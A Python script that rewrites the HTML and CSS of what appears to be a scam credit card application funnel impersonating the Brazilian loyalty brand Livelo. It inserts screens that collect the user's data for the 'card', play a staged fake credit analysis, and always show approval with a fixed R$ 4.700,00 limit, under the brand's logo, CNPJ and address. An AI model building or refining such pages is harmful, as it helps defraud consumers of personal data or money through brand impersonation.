import re
import os

html_path = r"d:\Paginas ADS\Livelo\templates\index.html"
css_path = r"d:\Paginas ADS\Livelo\static\css\main.css"

with open(html_path, "r", encoding="utf-8") as f:
    html = f.read()

with open(css_path, "r", encoding="utf-8") as f:
    css = f.read()

# 1. Trocar a screen-welcome (Imagem 5)
novo_welcome = """<!-- ═══════ BOAS-VINDAS / TERMOS (Tela 2) ═══════ -->
<div class="screen" id="screen-welcome">
<div class="step-container" style="justify-content:center;min-height:90vh">
<div style="text-align:center;margin-bottom:28px">
      {%- if sys_config and sys_config.get('system_logo_url') %}
        <img alt="Logo" src="{{ sys_config.get('system_logo_url') }}" style="height:36px;max-width:100%;object-fit:contain"/>
      {%- else %}
        <svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
      {%- endif %}
    </div>
<div class="step-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.3rem;margin-bottom:4px">Conta digital e cartão de crédito</h2>
<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.9rem">Tudo o que você precisa em um só lugar</p>
<div style="display:flex;flex-direction:column;gap:12px;margin-bottom:24px">
<div class="info-block" style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;display:flex;gap:12px;align-items:center">
<svg fill="none" height="20" style="flex-shrink:0" viewbox="0 0 24 24" width="20"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="#E5147A"></path></svg>
<span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Crédito sujeito a análise e aprovação.</span>
</div>
<div class="info-block" style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;display:flex;gap:12px;align-items:flex-start">
<svg fill="none" height="24" style="flex-shrink:0;margin-top:2px" viewbox="0 0 24 24" width="24"><path d="M4 7c0-1.66 3.58-3 8-3s8 1.34 8 3-3.58 3-8 3-8-1.34-8-3zm0 5c0 1.66 3.58 3 8 3s8-1.34 8-3" stroke="#E5147A" stroke-linecap="round" stroke-width="2"></path><path d="M4 17c0 1.66 3.58 3 8 3s8-1.34 8-3" stroke="#E5147A" stroke-linecap="round" stroke-width="2"></path><path d="M4 7v10M20 7v10" stroke="#E5147A" stroke-linecap="round" stroke-width="2"></path></svg>
<span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Os dados fornecidos por você a seguir serão utilizados para o processo de aquisição do cartão de crédito.</span>
</div>
<div class="info-block" style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;display:flex;gap:12px;align-items:flex-start">
<svg fill="none" height="24" style="flex-shrink:0;margin-top:2px" viewbox="0 0 24 24" width="24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z" fill="#E5147A"></path></svg>
<span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Ao prosseguir, você concorda com os termos de uso e política de privacidade da Livelo.</span>
</div>
</div>
<button class="btn-primary" onclick="goToStep('income')" style="margin-top:0">Li e concordo →</button>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""
html = re.sub(r'<!-- ═══════ BOAS-VINDAS.*?</div>\s*</div>\s*</div>' , novo_welcome, html, flags=re.DOTALL)

# 2. Trocar a screen-motivo (Imagem 3)
novo_motivo = """<!-- ═══════ MOTIVO ═══════ -->
<div class="screen" id="screen-motivo">
<div class="step-container" style="justify-content:center;min-height:90vh">
<div style="text-align:center;margin-bottom:28px">
      {%- if sys_config and sys_config.get('system_logo_url') %}
        <img alt="Logo" src="{{ sys_config.get('system_logo_url') }}" style="height:36px;max-width:100%;object-fit:contain"/>
      {%- else %}
        <svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
      {%- endif %}
    </div>
<div class="step-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.25rem;margin-bottom:24px;line-height:1.4">Qual é o seu interesse com um<br/>Cartão de Crédito hoje?</h2>
<div style="display:flex;flex-direction:column;gap:10px">
<button class="motivo-btn" onclick="selectMotivo(this, 'Fazer uma compra específica')">Fazer uma compra específica</button>
<button class="motivo-btn" onclick="selectMotivo(this, 'Fazer uma viagem')">Fazer uma viagem</button>
<button class="motivo-btn" onclick="selectMotivo(this, 'Poder gastar mais')">Poder gastar mais</button>
<button class="motivo-btn" onclick="selectMotivo(this, 'Organizar o meu financeiro')">Organizar o meu financeiro</button>
<button class="motivo-btn" onclick="selectMotivo(this, 'Outros')">Outros</button>
</div>
<div class="error-msg hidden" id="motivo-error"></div>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""
html = re.sub(r'<!-- ═══════ MOTIVO.*?</div>\s*</div>\s*</div>\s*</div>' , novo_motivo, html, flags=re.DOTALL)


# 3. Adicionar Limit Info (Imagem 2)
novo_limit = """
<!-- ═══════ LIMIT INFO ═══════ -->
<div class="screen" id="screen-limit-info">
<div class="step-container" style="justify-content:center;min-height:90vh">
<div style="text-align:center;margin-bottom:28px">
<svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
</div>
<div class="step-card" style="padding:40px 30px">
<h2 class="step-title" style="font-size:1.3rem;margin-bottom:4px">Entenda como funciona seu limite</h2>
<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.85rem">Saiba como seu limite de crédito pode aumentar ou diminuir</p>
<div style="display:flex;flex-direction:column;gap:12px;margin-bottom:24px">
<div style="background:#F0FDF4;border:1px solid #BBF7D0;border-radius:12px;padding:20px;text-align:center">
<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:6px">Aumento de Limite</div>
<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente.</div>
</div>
<div style="background:#FEFCE8;border:1px solid #FEF08A;border-radius:12px;padding:20px;text-align:center">
<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:6px">Redução de Limite</div>
<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido.</div>
</div>
</div>
<button class="btn-primary" onclick="goToStep('analysis')" style="margin-top:0">Concordo →</button>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""
html = html.replace('<!-- ═══════ ANÁLISE ═══════ -->', novo_limit + '\n<!-- ═══════ ANÁLISE ═══════ -->')


# 4. Trocar Analysis (Imagem 4)
novo_analysis = """<!-- ═══════ ANÁLISE ═══════ -->
<div class="screen" id="screen-analysis">
<div class="step-container" style="justify-content:center;min-height:90vh">
<div style="text-align:center;margin-bottom:28px">
<svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
</div>
<h2 class="step-title" style="font-size:1.15rem;margin-bottom:24px">Aguarde enquanto processamos seu pedido</h2>
<div class="card-preview-sm" style="margin-bottom:32px">
<div class="credit-card sm" data-color="gradient_pink">
<div class="card-face">
<div class="card-row-top">
<img alt="Livelo" src="/static/images/logo-branco.png" style="height:32px; max-width:140px; object-fit:contain; flex-shrink:0; display:block"/>
<svg fill="none" height="18" style="flex-shrink:0;display:block" viewbox="0 0 24 24" width="18"><path d="M12 4C7.58 4 4 7.58 4 12s3.58 8 8 8" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path><path d="M12 7.5C9.01 7.5 6.5 10.01 6.5 13s2.51 5.5 5.5 5.5" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path><path d="M12 11C10.34 11 9 12.34 9 14s1.34 3 3 3" stroke="rgba(255,255,255,0.75)" stroke-linecap="round" stroke-width="1.8"></path></svg>
</div>
<div class="card-chip"><svg fill="none" height="22" viewbox="0 0 40 30" width="30"><rect fill="#D4AF37" height="28" rx="4" stroke="#B8960C" stroke-width="0.5" width="38" x="1" y="1"></rect><rect fill="#C9A227" height="20" rx="2" stroke="#B8960C" stroke-width="0.5" width="16" x="12" y="5"></rect></svg></div>
<div class="card-row-number"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span>8790</span></div>
<div class="card-row-bottom">
<div><div class="card-label">NOME DO TITULAR</div><div class="card-value" id="analysis-name-display" style="font-size:0.68rem">SEU NOME</div></div>
<div><div class="card-label">VALIDADE</div><div class="card-value" style="font-size:0.68rem">12/28</div></div>
<svg fill="none" height="24" viewbox="0 0 52 32" width="36"><circle cx="20" cy="16" fill="#EB001B" opacity="0.9" r="14"></circle><circle cx="32" cy="16" fill="#F79E1B" opacity="0.9" r="14"></circle></svg>
</div>
</div>
</div>
</div>
<div class="analysis-steps" style="max-width:280px;margin:0 auto;width:100%">
<div class="astep" id="astep-1"><div class="astep-icon checking"></div><span>Aguardando resposta</span></div>
<div class="astep" id="astep-2"><div class="astep-icon pending"></div><span>Analisando seu perfil</span></div>
<div class="astep" id="astep-3"><div class="astep-icon pending"></div><span>Preparando seu cartão</span></div>
<div class="astep" id="astep-4"><div class="astep-icon pending"></div><span>Finalizando solicitação</span></div>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""
html = re.sub(r'<!-- ═══════ ANÁLISE.*?</div>\s*</div>\s*</div>' , novo_analysis, html, flags=re.DOTALL)


# 5. Trocar Approved (Imagem 1)
novo_approved = """<!-- ═══════ APROVADO ═══════ -->
<div class="screen" id="screen-approved">
<div class="step-container" style="justify-content:center;min-height:90vh">
<div style="text-align:center;margin-bottom:28px">
<svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
</div>
<div class="step-card" style="padding:40px 30px">
<div style="display:flex;justify-content:center;margin-bottom:20px">
<div style="width:48px;height:48px;border-radius:50%;background:#D1FAE5;display:flex;align-items:center;justify-content:center">
<svg fill="none" height="28" viewbox="0 0 24 24" width="28"><path d="M5 13l4 4L19 7" stroke="#10B981" stroke-linecap="round" stroke-linejoin="round" stroke-width="3"></path></svg>
</div>
</div>
<h2 class="step-title" style="font-size:1.25rem;margin-bottom:12px;line-height:1.3">Seu cartão foi aprovado com<br/>sucesso!</h2>
<p class="step-sub" style="margin-top:0;margin-bottom:20px;font-size:0.85rem">Parabéns! Você agora tem acesso a todos os benefícios exclusivos do seu novo cartão.</p>
<div style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:16px;text-align:center;margin-bottom:20px">
<p style="font-size:0.8rem;color:var(--text-muted);line-height:1.45;margin:0">Analisamos suas informações e notamos que este é o primeiro cartão que você solicita conosco. Sendo assim, não conseguimos liberar limites acima de R$ 5.000,00.</p>
</div>
<div style="background:var(--pink-dark);border-radius:12px;padding:24px;text-align:center;margin-bottom:20px;color:white;box-shadow:0 8px 24px rgba(229,20,122,0.3)">
<div style="font-size:0.8rem;font-weight:600;margin-bottom:2px">Seu novo cartão</div>
<div style="font-size:0.85rem;font-weight:800;margin-bottom:16px">VISA GOLD</div>
<div id="approved-limit" style="font-size:1.8rem;font-weight:800;letter-spacing:-0.03em">R$ 4.700,00</div>
</div>
<button class="btn-primary" onclick="goToStep('card-style')" style="margin-top:0">Continuar →</button>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
"""
html = re.sub(r'<!-- ═══════ APROVADO.*?</div>\s*</div>\s*</div>' , novo_approved, html, flags=re.DOTALL)


# Atualizando o CSS
css += """
/* === NOVOS ESTILOS LO === */
.motivo-btn {
  width: 100%;
  padding: 16px;
  background: white;
  border: 1.5px solid var(--pink);
  border-radius: 12px;
  color: var(--text);
  font-size: 0.9rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
  text-align: center;
}
.motivo-btn:hover {
  background: var(--pink-soft);
  transform: translateY(-1px);
}
.motivo-btn.selected {
  background: var(--pink);
  color: white;
}
"""

with open(html_path, "w", encoding="utf-8") as f:
    f.write(html)
    
with open(css_path, "w", encoding="utf-8") as f:
    f.write(css)

print("HTML e CSS modificados com sucesso!")
-->